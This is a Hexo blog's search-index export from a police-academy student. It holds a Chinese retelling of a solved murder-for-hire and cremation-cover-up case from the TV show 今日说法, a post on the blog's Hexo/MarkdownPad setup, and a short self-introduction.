<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAJRYuecjyHe81sbe34tNykwOXmwzo03x6z0DHyGwMD43jWIjUalGQGA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA9r1gu04JnKzv5qZjzpOMGZGpKicIyEx9b13t40Jbw729pmHeVFXDfQw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>韩宝山在警方的审问中，交待了犯罪事实，是他，<strong><strong>杀害了韩本立</strong></strong>！</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAP5OqmBXrvOSxuMNNPWTU0HVSzk9Qgd1IGASzWbSZbXxnIibyLVYm9Wg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>他为什么杀韩本立呢？</p>
<p>剧情到这里玄幻了！</p>
<p>原来韩宝山和韩本立，最初都是失踪的王希元雇来杀人，给他们10万块钱，让他们去杀一个叫<strong><strong>张本岭</strong></strong>的人。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAtMaDjia7VRCFfnFfACG9kRhqhsUF8UaKTJeHsmNwj2ia60RicJE6S6K2Q/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAXmLOjT4rZelviaJgft0ic8FibMzdXOMp69tnOruw8ouT4ibfwHwlwEmvdw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>他们尝试过在张本岭的车<strong><strong>放炸药</strong></strong>，制造车祸，但是都失败了，炸药提前爆炸，张本岭逃过一劫。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAD8AlWlnZvv9uwkXQjIOHo54LVGYicUXnXfLQrFKnSY8hHF4IjRWGLCg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>然后韩宝山接到王希元的要求，让他把韩本立杀了，他就可以获得两个人的钱！</p>
<p>总之，他必须要<strong><strong>杀一个人</strong></strong>。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAf0cWIYTddQEpapk8U5cs1IxY75qMPVG45KhXxplMibAKle5tR81DkOQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAyEjwtKE67k55iblqZ1mdk7dI4pC1QgCOibtXUKbovm6FlMryJWYIShUQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>现在已经不知道王希元怎么会提出那么奇怪的条件，大约是他觉得钱花了，没人死，不值得吧。</p>
<p>残忍的人的想法，真是我们难以理解的。</p>
<p>韩宝山考虑后，为了钱决定<strong><strong>杀掉韩本立</strong></strong>，他拿着两人，买来想暗杀张本岭的斧子，砍向了韩本立……</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAJWh35cI7dMOFyibrMTIDnpv5QvibpFdYGmEeXHjNVoSRxS0UzmyKbjYw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>王希元心理变态，要求别人杀人，甚至杀不相干的人；韩宝山也是心狠手辣，自己老乡都能下得去手；韩本立来当杀手，结果自己被杀死，这一圈人，真是没一个无辜的。</p>
<p>韩宝山杀了韩本立，和王希元一起拿小车把尸体抛到机井，两人共同作案，之后韩宝山就逃回了天津。</p>
<p><strong><strong>案件就此告破</strong></strong>！</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAPbIHgmUXfYQ1Tib5ktWaPowGM9g99BuFMxQNhzQgFZ1bfzRiaWpDIJvQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>看到这里，就可以结案了，死者身份确定，凶手身份确定，一切都清清楚楚了。</p>
<p>只要再抓到潜逃的王希元，就大功告成了。</p>
<p>但是！</p>
<p><strong><strong>王希元就是抓不到</strong></strong>！</p>
<p>他的家人，他的亲戚，他的朋友全无联系，他的身份证再没有被使用过，他的银行户口一毛钱都没动过……</p>
<p>整整2年过去，王希元一点生活痕迹也没有。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAFKabyKSIictLAnxLfwccWDd1STht1wIibua9MHHSPngyQ4XTB88gAKew/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtABbh0uMRo1YvFyiaMnH56tsE30VmKJG0ONup9tWXRW5p8896qDicKXGIQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>警方注意到一点点<strong><strong>不寻常的痕迹</strong></strong>是，王希元在失踪后曾经给村民群发过短信，说自己去躲债了。</p>
<p>他群发给大家说“兄弟”，可是他还发给了爷爷叔叔辈的乡亲，在商河孙集乡，辈分是很被看重的，王希元这样给长辈发短信，很是奇怪。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAwAPX9V5Vg37nnGtRSbLHKbK7NPUOMWUH4vI5XVCVe2uqPmLPKHkeag/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>于是警方有一个结论：<strong><strong>王希元死了</strong></strong>。</p>
<p>一个活着的人，是不会没有任何生活痕迹的，他们见过很多逃犯，都会偷偷用钱或者联系家人，但是王希元没有，加上这条古怪的短信，只有一个可能性，他死了。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtApWibcwIzEKKGW8wzlMGIKwXxloWDATfiaibWD8suZloKOApEwlic0L40XA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>他们又去审讯了韩宝山，因为他杀了一个人，很有可能把王希元也杀死了，但是韩宝山抵死不认，坚决否认，说自己杀了韩本立就回天津，绝对没有再杀人。</p>
<p>所以，现在警方面对的情况是：</p>
<p><strong><strong>没有尸体，没有凶手</strong></strong>。</p>
<p>但却高度怀疑，有一个人死了。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAYCOFM7JXsZNOo5Rq6zy9cOdicbY4n6RgRD2QVs8C0hbFlibktM8Q1gCg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>已经过了两年了，证据是肯定都没有了，只有走访村民的口供，警方不断的走访，都已经让村民疲倦，自己也尴尬。</p>
<p>但他们还是得到了一个线索：王希元最后一次有人看见，是大雾加小雪的天气。</p>
<p>这一天，是2010年3月9号。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtABL74gbHNiauicA80LQngcrGfCNzlNxhxgcQoCRw5U1mHZqdAYIabibZ5g/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>韩宝山便排除了嫌疑，他那时已经和王希元没有联系，也没有回到山东。</p>
<p>那么，是谁杀死了王希元？</p>
<p><strong><strong>他真的死了吗？</strong></strong></p>
<p>警方找不到线索，离王希元消失过了两年，他们还是找不到凶手，也找不到王希元。</p>
<p>在我们普通人观念里，王希元这么坏，他肯定是逃走了，要找一个逃走的人是很难的，案件估计就闲置了。</p>
<p>但是警方还是在开会，反复讨论案件。</p>
<p>在他们一次开会中，一位警员说到他们当初查找王希元时，也走访了他买凶杀人的对象<strong><strong>张本岭</strong></strong>，张本岭知道王希元找人暗杀他，对他们的暗杀方式很看不上，什么抛尸到机井，觉得太笨了。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAzKic7QBeibsjH6ibbZALGZFtE1B11D50zJoqEtyUmNZGjKNyOXo33x3qw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAeo7iar067DvcBsjYibUXjyiaMr1OMCIacpQRvGLbU8AY9eav5iaxbg15Ag/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>张本岭说了一句话：我要作案的话，我就把他给烧掉。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2akfe3wA6ichcbokvxHx9MLwB5sNNzBc2aR0fwTPtdUia3FCfN9ibfyWA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>刑侦大队长听到这个细节，马上就心里一动。</p>
<p>真·路人是不会想到什么杀人手法的，张本岭是不是说了实话？</p>
<p>然后他们开始查张本岭！</p>
<p>张本岭是职业是经营殡葬事业，花圈、寿衣，包括送尸体到殡仪馆火化。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2zqzmDkicqPHnYBNibttAEY8XIsDoz7ZWg6bR7TOokdeO7ibVylYbpHmg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAdo5ZNRLaLek94g2EEXpKJ33QdjS9WQTFnNLb1tQQnA0icTDvkmZmuEA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>张本岭在他们的判断中，是受害人的身份，怎么会反过来杀人？</p>
<p>但是王希元恨他恨到要杀死他，他对王希元，难道不恨？</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAc8NggJaOP7iaibhU0FhDEqechQxuMXYYeJ6MLUY0ibiad74Sicr5vVMOArQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>于是警方推开了新思路大门：<strong><strong>受害人可能是加害人</strong></strong>！</p>
<p>张本岭有可能也恨王希元，被他暗害多次，于是反过来杀了他，并且利用自己的职业方便，把他拉去殡仪馆火化烧掉，毁尸灭迹！</p>
<p>这个猜想，让警方又有了追查的方向。</p>
<p>可是他们很快就遇到了最大的难题：</p>
<p><strong><strong>没有证据</strong></strong>。</p>
<p>国家对火化程序控制很严格，非正常死亡需要公安局开证明，自然死亡的人员也需要村委会开具证明才能火化。</p>
<p>在3月9日，王希元失踪的前后十天，当地殡仪馆火化的每一具尸体，都是开了证明的真实的人。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA0vGvj0K0dnI2zarU8FgW7TGj0nuTKY7thRRF3DJ5cCGZz2rg2RV06g/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>他们扩大了范围，发现原来张本岭并不是在当地，而是在周边，一共火化了5个人，并且出具了5个火化证明，死亡证明，手续完备。</p>
<p>这是“<strong><strong>完美不在场证明</strong></strong>”。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA5lfuyBBpXFIdq6X44n9cC7EJKPq4CyO7ibtIQiabNwlVicQI5jQgicrM2Q/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAibfIku2DPHMg9KRficZbcWiaKOg5TqDKkGZOqBQTiauUvicfJrBBibITSu7w/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>可张本岭真的是很符合杀死王希元的嫌疑人，警方并没有就此放弃，继续沿着张本岭查下去，他们连夜回到殡仪馆，查了张本岭十年内送来火化的名单。</p>
<p>终于发现了<strong><strong>关键性证据</strong></strong>！</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAreBx646SCaCRkUHwa1Hj5JBVc9VgZqiateuZFqYiaUR0a1qTes0suPdA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>张本岭在2008年送去火化的一位丁姓老人，名字出现在他3月9日送到邻县火化的名单中。</p>
<p>一个人，<strong><strong>被火化了两次</strong></strong>！</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAsDZibKcEz25s1XPe6SYlyPyvCJ1nbInKdLGVDphTKHyZtJl9z94tcIA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtALdkg7YG3L3zDEk7sOJt8W73rm0ZNLzhdMOMSGV3I23PabkMKQF6ckg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA82zw5BaROTakqgyNN9rgxiakWuhSL3nLicXAuzGsrXxK8E7bR8m77nIw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAJ1IiaxPGuSVo38jr99xl7bfOUN0VeTH6gu929ykP7ibvQvf8HsCAFx8Q/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAzACI2Ekw8IbA5dDjxLFbsmib2PZ37OXhPVy1eibZIrKnphx4WicTUSlCA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAmGTwMib2X9o4VSIvgIXPmSvtheXHibTDe5UKricAVI1lnKpibVCoics7S2A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAjdY4OEt0shBeicZECe6nibrbVGmQjutACJpFakiauudjP3btibcZaWwZ6A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>这下张本岭的嫌疑非常大了，他送去火化的人，警方猜测肯定是王希元。</p>
<p>可问题是，王希元如果真被火化了，那死无对证，如果张本岭死不承认，这事情也很难给张本岭定罪。</p>
<p>他火化的人，和失踪的人，如何证明是同一个人？</p>
<p>谁又能保证他火化的是王希元？</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtACeZ3JkXuhGbXLAM2qEajNMZVSPfATDwfu192xnTXAvTNuzaiaSxJeMA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>这就是大家都已经确定他有问题，是最可能犯案的人，但是没有证据，不符合法律程序，就没办法定罪。</p>
<p>还需要他和王希元之间更多的联系证据。</p>
<p>事情在哪里发了转机呢？</p>
<p>警方和张本岭的老婆张红霞套话，问他们家有什么不一样，他老婆被套出，家里沙发椅子的<strong><strong>座垫</strong></strong>不见了。</p>
<p>于是警方又到张本岭家去检验他的沙发椅子，有了重大发现：</p>
<p>沙发椅后面的木条，有血迹。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtADX0sma7xcoiaicA8V2aeC39iaLhC9CrqYQJEYqibnXF2rdKnG98NVoYFibA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>DNA对比后发现果然是<strong><strong>王希元的血迹</strong></strong>，张本岭家，就是第一案发现场！</p>
<p>现在证据确凿，在警方的审讯下，张本岭终于交待了作案事实。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAPuR5BQkvh5XDqbMfxgVQShOTyvVNq18eWCrIHPVw3zsmrADeaMsGxQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>原来他的老婆张红霞和王希元一直在<strong><strong>偷情</strong></strong>，他们两个为了在一起，<strong><strong>雇凶</strong></strong>杀张本岭，结果没杀死张本岭，去让杀手自相残杀。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAJQQdiaheP55rTj48SeBMM1bhJCLibPM8jicx6Hb6pxZDePsZZjJp31Fog/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>张本岭知道他们在一起，于是找了王希元来家里，最后争吵中杀死了王希元，伙同自己的朋友李文西把王希元抬到火化车上，他利用<strong><strong>当地开具死亡证明的漏洞</strong></strong>，去搞了空白的死亡证明，顺利的火化了王希元，毁尸灭迹！</p>
<p>所以看似受害人的他，竟然是凶手。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA3NZDuv61OapMM8f5gekMuDpYqCvg9sMiaqLzXkXdeZgSriahqNicdXsOQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtATyrqa3nEwEsvQjKxJqU8G1Hu5Wj9xjnB3DnScB0qMial5x2gFnJ3s3g/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2zOXdzb66olnbC3jubriaic2CX3OeAiaplubk2eoJk7Qic4Fg84J21HUxw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>最后韩宝山被判死缓，张红霞判刑11年，当地开死亡证明的漏洞，也被补上。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA8TjEb4JoXfpzKRsNDD7HV1eKGJ4DuqYb25UGP8mfz4L3Q2XfsSrp0w/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>这个连环杀人案两年告破，从无名男尸到杀手，从买凶杀人到自己被害，真的是曲折离奇，频频遇到案件卡住。</p>
<p>可某个环节进行不下去，警方都能从另一个角度侦破，不放过细节，终于找到真相。</p>
<p>每一次案件进入死路，每一次大胆的猜测，都非常令人惊叹！</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAoBibYDO4fUMyYlulrU14JBtiaGoWGVjddMSbA5iaBzts06sWI8S7xmuyA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>我在《今日说法》结束后，专门去看了法院的判决书，发现张本岭开始有狡辩，张本岭说王希元进门拿“喷雾”喷他，然后他就神志不清了，等他清醒，王希元就死了，自己手里拿着木棍……</p>
<p>2014年4月，张本岭一案开庭，他被判无期徒刑，同伙李文西判9年。</p>
<p>王家和张本岭索赔30万，最后得到了2万的赔偿。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAMGcKCeBhnLHHNP6hxxrO3WDpCLYkYgs3fswO1gnjibpmIBPfOCQMrTg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtARgpdHYhKJG0YeAXeGxyKVPKnsSvI77Lt7XAxofQgyY2jPffcicB8ZWA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>————————————————————</p>
<p>这个故事里没有一个是好人，也没有人无辜，但是能复杂成这样，相当罕见，警方能侦破，法网恢恢，疏而不漏，更是值得敬佩。</p>
<p>希望这个案件能被拍成电影或者电视剧，让段奕宏张译这样是实力派来演，毕竟案情实在太曲折了，太离奇了。</p>
<p>其中张本岭的心态真是稳，明明自己是真凶，却能在警方多次询问保持镇定，毫无破绽。</p>
<p>警方队长在最初找不到死者身份，到后期连死者都找不到，居然能破案，让人惊叹！</p>
<p>最后，从案件得出结论，婚外恋劈腿风险高，触犯法律更完蛋，螳螂捕蝉黄雀在后，逼急了谁都可以当坏人。</p>
]]></content>
      
        
        <tags>
            
            <tag> 摘录 </tag>
            
            <tag> 警察 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[博客环境]]></title>
      <url>/2017/11/20/hexo-environment/</url>
      <content type="html"><![CDATA[<ul>
<li>blog使用的环境是git+nodejs+<strong><strong>Hexo</strong></strong>+github,至于为什么用hexo还不是因为穷。</li>
</ul>
<p><img src="http://ww1.rs.fanjian.net/c/ca/72/2d/55caa1800872a8677e2dd43c4be4b58f.jpg" alt="">  </p>
<p>我的网址是ppsuc.github.io让我有点惶恐,我也不知道为什么当初注册的github账户名是这个，希望以后的师弟搜github闲着无聊试着搜学校的时候却搜到一个莫名其妙的用户的时候不要打我2333，hexo主题是yilia,地址在</p>
<blockquote>
<p><a href="https://github.com/litten/hexo-theme-yilia" target="_blank" rel="noopener">https://github.com/litten/hexo-theme-yilia</a>  </p>
</blockquote>
<ul>
<li>markdown编辑器用的软件是<strong><strong>MarkdownPAd</strong></strong>，个人觉得灰常好用，输入code处理上面不是特别给力，无伤大雅</li>
</ul>
<a id="more"></a>
<p><strong>ps:贴一下MarkdownPad的语法文档</strong></p>
<h2 id="Welcome-to-MarkdownPad-2"><a href="#Welcome-to-MarkdownPad-2" class="headerlink" title="Welcome to MarkdownPad 2"></a>Welcome to MarkdownPad 2</h2><p><strong>MarkdownPad</strong> is a full-featured Markdown editor for Windows.</p>
<h3 id="Built-exclusively-for-Markdown"><a href="#Built-exclusively-for-Markdown" class="headerlink" title="Built exclusively for Markdown"></a>Built exclusively for Markdown</h3><p>Enjoy first-class Markdown support with easy access to  Markdown syntax and convenient keyboard shortcuts.</p>
<p>Give them a try:</p>
<ul>
<li><strong>Bold</strong> (<code>Ctrl+B</code>) and <em>Italic</em> (<code>Ctrl+I</code>)</li>
<li>Quotes (<code>Ctrl+Q</code>)</li>
<li>Code blocks (<code>Ctrl+K</code>)</li>
<li>Headings 1, 2, 3 (<code>Ctrl+1</code>, <code>Ctrl+2</code>, <code>Ctrl+3</code>)</li>
<li>Lists (<code>Ctrl+U</code> and <code>Ctrl+Shift+O</code>)</li>
</ul>
<h3 id="See-your-changes-instantly-with-LivePreview"><a href="#See-your-changes-instantly-with-LivePreview" class="headerlink" title="See your changes instantly with LivePreview"></a>See your changes instantly with LivePreview</h3><p>Don’t guess if your <a href="http://markdownpad.com" target="_blank" rel="noopener">hyperlink syntax</a> is correct; LivePreview will show you exactly what your document looks like every time you press a key.</p>
<h3 id="Make-it-your-own"><a href="#Make-it-your-own" class="headerlink" title="Make it your own"></a>Make it your own</h3><p>Fonts, color schemes, layouts and stylesheets are all 100% customizable so you can turn MarkdownPad into your perfect editor.</p>
<h3 id="A-robust-editor-for-advanced-Markdown-users"><a href="#A-robust-editor-for-advanced-Markdown-users" class="headerlink" title="A robust editor for advanced Markdown users"></a>A robust editor for advanced Markdown users</h3><p>MarkdownPad supports multiple Markdown processing engines, including standard Markdown, Markdown Extra (with Table support) and GitHub Flavored Markdown.</p>
<p>With a tabbed document interface, PDF export, a built-in image uploader, session management, spell check, auto-save, syntax highlighting and a built-in CSS management interface, there’s no limit to what you can do with MarkdownPad.</p>
]]></content>
      
        
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 胡言乱语 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[今天开始写博客]]></title>
      <url>/2017/11/20/blog-start/</url>
      <content type="html"><![CDATA[<p>Vicen，大三在读警校生一枚，多多指教~~~</p>
]]></content>
      
        
    </entry>
    
  
  
</search>
